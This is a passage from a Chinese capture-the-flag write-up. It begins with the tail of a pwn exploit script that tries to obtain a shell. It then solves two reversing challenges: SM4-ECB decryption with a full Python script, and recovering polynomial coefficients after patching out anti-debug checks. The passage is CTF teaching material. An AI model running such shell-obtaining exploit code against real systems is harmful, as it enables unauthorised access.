class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">60</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> stage2_shell():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] Failed to get shell&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>同样直接用  AI 跑出来了</p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="c-sm4"><a href="#c-sm4" class="headerlink" title="c_sm4"></a>c_sm4</h3><p>压缩包里有一个密文文本文件和一个可执行文件，文件加了个upx壳，直接脱了</p>
<p>ida打开脱壳后的可执行文件，审计代码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=N2M0N2Y5ZjVmM2ZhYmIxZmU2ZGFiYjQ0OWM3Y2EzNGJfbExLVmxtR1RGZDVtWkZpemFPYnk1UXI3Mmt2bFo5U2FfVG9rZW46Qzc4YmJYZmd1b3VPV2J4dlVNSmNoZjhEbldnXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDNlMWE2Mzk3YmExYWQwYWM1NTIwMWYzNDEyNjI5YWVfSUEwMmt2RnBWNW9QTzlFaHA4QUpwbERna0E0RkJ5TDZfVG9rZW46U2ZXRGI0UzBNb2xveEx4eVlpbWMzVEJabjJlXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>是ebc模式的标准sm4算法，直接写代码解密就行</p>
<p><strong>EXP：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Implement SM4 ECB PKCS7 decryption to recover plaintext</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SM4 constants</span></span><br><span class="line">SM4_SBOX = [</span><br><span class="line"><span class="number">0xd6</span>,<span class="number">0x90</span>,<span class="number">0xe9</span>,<span class="number">0xfe</span>,<span class="number">0xcc</span>,<span class="number">0xe1</span>,<span class="number">0x3d</span>,<span class="number">0xb7</span>,<span class="number">0x16</span>,<span class="number">0xb6</span>,<span class="number">0x14</span>,<span class="number">0xc2</span>,<span class="number">0x28</span>,<span class="number">0xfb</span>,<span class="number">0x2c</span>,<span class="number">0x05</span>,</span><br><span class="line"><span class="number">0x2b</span>,<span class="number">0x67</span>,<span class="number">0x9a</span>,<span class="number">0x76</span>,<span class="number">0x2a</span>,<span class="number">0xbe</span>,<span class="number">0x04</span>,<span class="number">0xc3</span>,<span class="number">0xaa</span>,<span class="number">0x44</span>,<span class="number">0x13</span>,<span class="number">0x26</span>,<span class="number">0x49</span>,<span class="number">0x86</span>,<span class="number">0x06</span>,<span class="number">0x99</span>,</span><br><span class="line"><span class="number">0x9c</span>,<span class="number">0x42</span>,<span class="number">0x50</span>,<span class="number">0xf4</span>,<span class="number">0x91</span>,<span class="number">0xef</span>,<span class="number">0x98</span>,<span class="number">0x7a</span>,<span class="number">0x33</span>,<span class="number">0x54</span>,<span class="number">0x0b</span>,<span class="number">0x43</span>,<span class="number">0xed</span>,<span class="number">0xcf</span>,<span class="number">0xac</span>,<span class="number">0x62</span>,</span><br><span class="line"><span class="number">0xe4</span>,<span class="number">0xb3</span>,<span class="number">0x1c</span>,<span class="number">0xa9</span>,<span class="number">0xc9</span>,<span class="number">0x08</span>,<span class="number">0xe8</span>,<span class="number">0x95</span>,<span class="number">0x80</span>,<span class="number">0xdf</span>,<span class="number">0x94</span>,<span class="number">0xfa</span>,<span class="number">0x75</span>,<span class="number">0x8f</span>,<span class="number">0x3f</span>,<span class="number">0xa6</span>,</span><br><span class="line"><span class="number">0x47</span>,<span class="number">0x07</span>,<span class="number">0xa7</span>,<span class="number">0xfc</span>,<span class="number">0xf3</span>,<span class="number">0x73</span>,<span class="number">0x17</span>,<span class="number">0xba</span>,<span class="number">0x83</span>,<span class="number">0x59</span>,<span class="number">0x3c</span>,<span class="number">0x19</span>,<span class="number">0xe6</span>,<span class="number">0x85</span>,<span class="number">0x4f</span>,<span class="number">0xa8</span>,</span><br><span class="line"><span class="number">0x68</span>,<span class="number">0x6b</span>,<span class="number">0x81</span>,<span class="number">0xb2</span>,<span class="number">0x71</span>,<span class="number">0x64</span>,<span class="number">0xda</span>,<span class="number">0x8b</span>,<span class="number">0xf8</span>,<span class="number">0xeb</span>,<span class="number">0x0f</span>,<span class="number">0x4b</span>,<span class="number">0x70</span>,<span class="number">0x56</span>,<span class="number">0x9d</span>,<span class="number">0x35</span>,</span><br><span class="line"><span class="number">0x1e</span>,<span class="number">0x24</span>,<span class="number">0x0e</span>,<span class="number">0x5e</span>,<span class="number">0x63</span>,<span class="number">0x58</span>,<span class="number">0xd1</span>,<span class="number">0xa2</span>,<span class="number">0x25</span>,<span class="number">0x22</span>,<span class="number">0x7c</span>,<span class="number">0x3b</span>,<span class="number">0x01</span>,<span class="number">0x21</span>,<span class="number">0x78</span>,<span class="number">0x87</span>,</span><br><span class="line"><span class="number">0xd4</span>,<span class="number">0x00</span>,<span class="number">0x46</span>,<span class="number">0x57</span>,<span class="number">0x9f</span>,<span class="number">0xd3</span>,<span class="number">0x27</span>,<span class="number">0x52</span>,<span class="number">0x4c</span>,<span class="number">0x36</span>,<span class="number">0x02</span>,<span class="number">0xe7</span>,<span class="number">0xa0</span>,<span class="number">0xc4</span>,<span class="number">0xc8</span>,<span class="number">0x9e</span>,</span><br><span class="line"><span class="number">0xea</span>,<span class="number">0xbf</span>,<span class="number">0x8a</span>,<span class="number">0xd2</span>,<span class="number">0x40</span>,<span class="number">0xc7</span>,<span class="number">0x38</span>,<span class="number">0xb5</span>,<span class="number">0xa3</span>,<span class="number">0xf7</span>,<span class="number">0xf2</span>,<span class="number">0xce</span>,<span class="number">0xf9</span>,<span class="number">0x61</span>,<span class="number">0x15</span>,<span class="number">0xa1</span>,</span><br><span class="line"><span class="number">0xe0</span>,<span class="number">0xae</span>,<span class="number">0x5d</span>,<span class="number">0xa4</span>,<span class="number">0x9b</span>,<span class="number">0x34</span>,<span class="number">0x1a</span>,<span class="number">0x55</span>,<span class="number">0xad</span>,<span class="number">0x93</span>,<span class="number">0x32</span>,<span class="number">0x30</span>,<span class="number">0xf5</span>,<span class="number">0x8c</span>,<span class="number">0xb1</span>,<span class="number">0xe3</span>,</span><br><span class="line"><span class="number">0x1d</span>,<span class="number">0xf6</span>,<span class="number">0xe2</span>,<span class="number">0x2e</span>,<span class="number">0x82</span>,<span class="number">0x66</span>,<span class="number">0xca</span>,<span class="number">0x60</span>,<span class="number">0xc0</span>,<span class="number">0x29</span>,<span class="number">0x23</span>,<span class="number">0xab</span>,<span class="number">0x0d</span>,<span class="number">0x53</span>,<span class="number">0x4e</span>,<span class="number">0x6f</span>,</span><br><span class="line"><span class="number">0xd5</span>,<span class="number">0xdb</span>,<span class="number">0x37</span>,<span class="number">0x45</span>,<span class="number">0xde</span>,<span class="number">0xfd</span>,<span class="number">0x8e</span>,<span class="number">0x2f</span>,<span class="number">0x03</span>,<span class="number">0xff</span>,<span class="number">0x6a</span>,<span class="number">0x72</span>,<span class="number">0x6d</span>,<span class="number">0x6c</span>,<span class="number">0x5b</span>,<span class="number">0x51</span>,</span><br><span class="line"><span class="number">0x8d</span>,<span class="number">0x1b</span>,<span class="number">0xaf</span>,<span class="number">0x92</span>,<span class="number">0xbb</span>,<span class="number">0xdd</span>,<span class="number">0xbc</span>,<span class="number">0x7f</span>,<span class="number">0x11</span>,<span class="number">0xd9</span>,<span class="number">0x5c</span>,<span class="number">0x41</span>,<span class="number">0x1f</span>,<span class="number">0x10</span>,<span class="number">0x5a</span>,<span class="number">0xd8</span>,</span><br><span class="line"><span class="number">0x0a</span>,<span class="number">0xc1</span>,<span class="number">0x31</span>,<span class="number">0x88</span>,<span class="number">0xa5</span>,<span class="number">0xcd</span>,<span class="number">0x7b</span>,<span class="number">0xbd</span>,<span class="number">0x2d</span>,<span class="number">0x74</span>,<span class="number">0xd0</span>,<span class="number">0x12</span>,<span class="number">0xb8</span>,<span class="number">0xe5</span>,<span class="number">0xb4</span>,<span class="number">0xb0</span>,</span><br><span class="line"><span class="number">0x89</span>,<span class="number">0x69</span>,<span class="number">0x97</span>,<span class="number">0x4a</span>,<span class="number">0x0c</span>,<span class="number">0x96</span>,<span class="number">0x77</span>,<span class="number">0x7e</span>,<span class="number">0x65</span>,<span class="number">0xb9</span>,<span class="number">0xf1</span>,<span class="number">0x09</span>,<span class="number">0xc5</span>,<span class="number">0x6e</span>,<span class="number">0xc6</span>,<span class="number">0x84</span>,</span><br><span class="line"><span class="number">0x18</span>,<span class="number">0xf0</span>,<span class="number">0x7d</span>,<span class="number">0xec</span>,<span class="number">0x3a</span>,<span class="number">0xdc</span>,<span class="number">0x4d</span>,<span class="number">0x20</span>,<span class="number">0x79</span>,<span class="number">0xee</span>,<span class="number">0x5f</span>,<span class="number">0x3e</span>,<span class="number">0xd7</span>,<span class="number">0xcb</span>,<span class="number">0x39</span>,<span class="number">0x48</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">SM4_CK = [</span><br><span class="line"><span class="number">0x00070e15</span>,<span class="number">0x1c232a31</span>,<span class="number">0x383f464d</span>,<span class="number">0x545b6269</span>,</span><br><span class="line"><span class="number">0x70777e85</span>,<span class="number">0x8c939aa1</span>,<span class="number">0xa8afb6bd</span>,<span class="number">0xc4cbd2d9</span>,</span><br><span class="line"><span class="number">0xe0e7eef5</span>,<span class="number">0xfc030a11</span>,<span class="number">0x181f262d</span>,<span class="number">0x343b4249</span>,</span><br><span class="line"><span class="number">0x50575e65</span>,<span class="number">0x6c737a81</span>,<span class="number">0x888f969d</span>,<span class="number">0xa4abb2b9</span>,</span><br><span class="line"><span class="number">0xc0c7ced5</span>,<span class="number">0xdce3eaf1</span>,<span class="number">0xf8ff060d</span>,<span class="number">0x141b2229</span>,</span><br><span class="line"><span class="number">0x30373e45</span>,<span class="number">0x4c535a61</span>,<span class="number">0x686f767d</span>,<span class="number">0x848b9299</span>,</span><br><span class="line"><span class="number">0xa0a7aeb5</span>,<span class="number">0xbcc3cad1</span>,<span class="number">0xd8dfe6ed</span>,<span class="number">0xf4fb0209</span>,</span><br><span class="line"><span class="number">0x10171e25</span>,<span class="number">0x2c333a41</span>,<span class="number">0x484f565d</span>,<span class="number">0x646b7279</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rotl</span>(<span class="params">x,n</span>): <span class="keyword">return</span> ((x&lt;&lt;n)&amp;<span class="number">0xffffffff</span>) | (x&gt;&gt;(<span class="number">32</span>-n))</span><br><span class="line"></span><br><span class="line"><span class="comment"># def tau(a):</span></span><br><span class="line"><span class="comment">#     b = a.to_bytes(4,&#x27;big&#x27;)</span></span><br><span class="line"><span class="comment">#     return int(bytes(SM4_SBOX[x] for x in b), &#x27;big&#x27;)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tau</span>(<span class="params">a</span>):</span><br><span class="line">    b = a.to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(</span><br><span class="line">        <span class="built_in">bytes</span>(SM4_SBOX[x] <span class="keyword">for</span> x <span class="keyword">in</span> b),</span><br><span class="line">        <span class="string">&#x27;big&#x27;</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">L</span>(<span class="params">x</span>): <span class="keyword">return</span> x ^ rotl(x,<span class="number">2</span>) ^ rotl(x,<span class="number">10</span>) ^ rotl(x,<span class="number">18</span>) ^ rotl(x,<span class="number">24</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Lp</span>(<span class="params">x</span>): <span class="keyword">return</span> x ^ rotl(x,<span class="number">13</span>) ^ rotl(x,<span class="number">23</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">T</span>(<span class="params">x</span>): <span class="keyword">return</span> L(tau(x))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Tp</span>(<span class="params">x</span>): <span class="keyword">return</span> Lp(tau(x))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">key_schedule</span>(<span class="params">key</span>):</span><br><span class="line">    MK = [<span class="built_in">int</span>.from_bytes(key[i:i+<span class="number">4</span>],<span class="string">&#x27;big&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">16</span>,<span class="number">4</span>)]</span><br><span class="line">    K = [</span><br><span class="line">        MK[<span class="number">0</span>]^<span class="number">0xA3B1BAC7</span>,</span><br><span class="line">        MK[<span class="number">1</span>]^<span class="number">0x56AA3352</span>,</span><br><span class="line">        MK[<span class="number">2</span>]^<span class="number">0x677D919A</span>,</span><br><span class="line">        MK[<span class="number">3</span>]^<span class="number">0xB27022E0</span></span><br><span class="line">    ]</span><br><span class="line">    rk=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        t = K[i+<span class="number">1</span>]^K[i+<span class="number">2</span>]^K[i+<span class="number">3</span>]^SM4_CK[i]</span><br><span class="line">        K.append(K[i]^Tp(t))</span><br><span class="line">        rk.append(K[i+<span class="number">4</span>])</span><br><span class="line">    <span class="keyword">return</span> rk</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sm4_decrypt_block</span>(<span class="params">ct, rk</span>):</span><br><span class="line">    X=[<span class="built_in">int</span>.from_bytes(ct[i:i+<span class="number">4</span>],<span class="string">&#x27;big&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">16</span>,<span class="number">4</span>)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        t = X[i+<span class="number">1</span>]^X[i+<span class="number">2</span>]^X[i+<span class="number">3</span>]^rk[<span class="number">31</span>-i]</span><br><span class="line">        X.append(X[i]^T(t))</span><br><span class="line">    out = X[<span class="number">35</span>].to_bytes(<span class="number">4</span>,<span class="string">&#x27;big&#x27;</span>)+X[<span class="number">34</span>].to_bytes(<span class="number">4</span>,<span class="string">&#x27;big&#x27;</span>)+X[<span class="number">33</span>].to_bytes(<span class="number">4</span>,<span class="string">&#x27;big&#x27;</span>)+X[<span class="number">32</span>].to_bytes(<span class="number">4</span>,<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="comment"># Given data</span></span><br><span class="line">cipher_hex = <span class="string">&quot;e35d1c09d861670051587475dba013bfe253923f8571add70f63a674dbeb8f22&quot;</span></span><br><span class="line">cipher = <span class="built_in">bytes</span>.fromhex(cipher_hex)</span><br><span class="line"></span><br><span class="line">key = <span class="built_in">bytes</span>([</span><br><span class="line"><span class="number">1</span>,<span class="number">0x23</span>,<span class="number">0x45</span>,<span class="number">0x67</span>,<span class="number">0x89</span>,<span class="number">0xAB</span>,<span class="number">0xCD</span>,<span class="number">0xEF</span>,</span><br><span class="line"><span class="number">0xFE</span>,<span class="number">0xDC</span>,<span class="number">0xBA</span>,<span class="number">0x98</span>,<span class="number">0x76</span>,<span class="number">0x54</span>,<span class="number">0x32</span>,<span class="number">0x10</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">rk = key_schedule(key)</span><br><span class="line"></span><br><span class="line">pt = <span class="string">b&#x27;&#x27;</span>.join(sm4_decrypt_block(cipher[i:i+<span class="number">16</span>], rk) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(cipher),<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># remove PKCS7</span></span><br><span class="line"><span class="comment"># remove PKCS7</span></span><br><span class="line">pad = pt[-<span class="number">1</span>]</span><br><span class="line">pt_unpad = pt[:-pad]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] As string:&quot;</span>, pt_unpad.decode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># unictf&#123;sm4ezze44ms&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="c-polynomial"><a href="#c-polynomial" class="headerlink" title="c_polynomial"></a>c_polynomial</h3><p>ida打开审计代码，发现有很多检测动调的函数，先把这些函数都nop掉</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=NWNhYTNlZTMwYWNhZGVkMzc1N2I0MWE2YzM4MWY5MjFfWmZmczVLQVA4M3BkcG1tUDZmSFkzTXN0SEoxem1lUTBfVG9rZW46UnZlRmJ2MVB3b1R0RG94U2FpYWNBSk5vbm5nXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>然后看关键代码</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">_main();</span><br><span class="line">  <span class="built_in">feclearexcept</span>(<span class="number">63</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">fetestexcept</span>(<span class="number">3</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Floating point exceptions are set, possibly being debugged.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;I&#x27;m practicing my neuro math skills. Give me nine integers: &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(</span><br><span class="line">    <span class="string">&quot;%d %d %d %d %d %d %d %d %d&quot;</span>,</span><br><span class="line">    coeffs,</span><br><span class="line">    &amp;dword_408044,</span><br><span class="line">    &amp;dword_408048,</span><br><span class="line">    &amp;dword_40804C,</span><br><span class="line">    &amp;dword_408050,</span><br><span class="line">    &amp;dword_408054,</span><br><span class="line">    &amp;dword_408058,</span><br><span class="line">    &amp;dword_40805C,</span><br><span class="line">    &amp;dword_408060);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hmm, let me think&quot;</span>);</span><br><span class="line">  v3 = __iob_func();</span><br><span class="line">  <span class="built_in">fflush</span>(v3 + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">46</span>);</span><br><span class="line">  v4 = __iob_func();</span><br><span class="line">  <span class="built_in">fflush</span>(v4 + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">46</span>);</span><br><span class="line">  v5 = __iob_func();</span><br><span class="line">  <span class="built_in">fflush</span>(v5 + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">-60</span>; i &lt;= <span class="number">59</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    total = <span class="number">0</span>;</span><br><span class="line">    power = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">8</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      total += power * coeffs[j];</span><br><span class="line">      power *= i;</span><br><span class="line">      result = total;</span><br><span class="line">    &#125;</span><br><span class="line">    ::v12 = i + <span class="number">37</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (i + <span class="number">37</span>) &lt;= <span class="number">0x36</span> &amp;&amp; (v14 = &amp;::v5, v13 = ::v12, v6 = ::v5, (v12 = _bittest64(&amp;v6, ::v12)) != <span class="number">0</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( result )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !result )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_13:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Those aren&#x27;t the right numbers. Try again!&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( dword_408060 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">8</span>; ++k )</span><br><span class="line">      coeffs[k] /= dword_408060;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( dword_40805C == <span class="number">-606</span> &amp;&amp; dword_408058 == <span class="number">44114</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Correct! Here&#x27;s the flag: &quot;</span>);</span><br><span class="line">    Src[<span class="number">0</span>] = coeffs[<span class="number">0</span>];</span><br><span class="line">    Src[<span class="number">1</span>] = dword_408044;</span><br><span class="line">    Src[<span class="number">2</span>] = dword_408048;</span><br><span class="line">    Src[<span class="number">3</span>] = dword_40804C;</span><br><span class="line">    <span class="built_in">LOWORD</span>(Src[<span class="number">4</span>]) = dword_408050;</span><br><span class="line">    <span class="built_in">HIWORD</span>(Src[<span class="number">4</span>]) = dword_408054;</span><br><span class="line">    <span class="built_in">LOWORD</span>(Src[<span class="number">5</span>]) = dword_408058;</span><br><span class="line">    <span class="built_in">HIWORD</span>(Src[<span class="number">5</span>]) = dword_40805C;</span><br><span class="line">    <span class="built_in">LOWORD</span>(Src[<span class="number">6</span>]) = dword_408060;</span><br><span class="line">    <span class="built_in">memcpy</span>(v9, Src, <span class="built_in">sizeof</span>(v9));</span><br><span class="line">    <span class="built_in">memcpy</span>(v10, Src, <span class="built_in">sizeof</span>(v10));</span><br><span class="line">    <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt;= <span class="number">51</span>; ++m )</span><br><span class="line">    &#123;</span><br><span class="line">      v9[m] ^= xorcode[m];</span><br><span class="line">      <span class="built_in">putchar</span>(v9[m]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;WRONG&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要求输入9个整数，使它们能构成一个8次多项式，输入对了则会输出flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=NGMzYzE2MmJlNmFhNDc2NGE2N2ExYzAxYzc0ZWZhZjhfYVNaR080WExCU05jeEdab01yTVpGN2tkRUpvd3ZoMTlfVG9rZW46SmpGQWJwZ1J0b1pTRlV4dE5UVGNBNUQ3bjBkXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>其中<code>dword_40805C == -606 &amp;&amp; dword_408058 == 44114</code> 是最终的判断条件。</p>
<p>由于最后输出的flag的生成逻辑跟输入的数字有关，所以这题的逆向流程要解出这个多项式</p>
<p>然后把代码和关键数据喂给ai，ai就能吐出满足条件的数字了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjUxN2JlNGRiYTRlZjg4ZjRhNmUzMzExMmZmYzQyMThfSURORnJhaTNQOXVBQ2lEMVJVMHVySG1BNFJraHNhMUlfVG9rZW46WXdBdWIwTnlqb3RWZUV4NWRXQWNsUXo5bm9kXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>将这9个整数输入程序验证，就能得到最终flag</p>
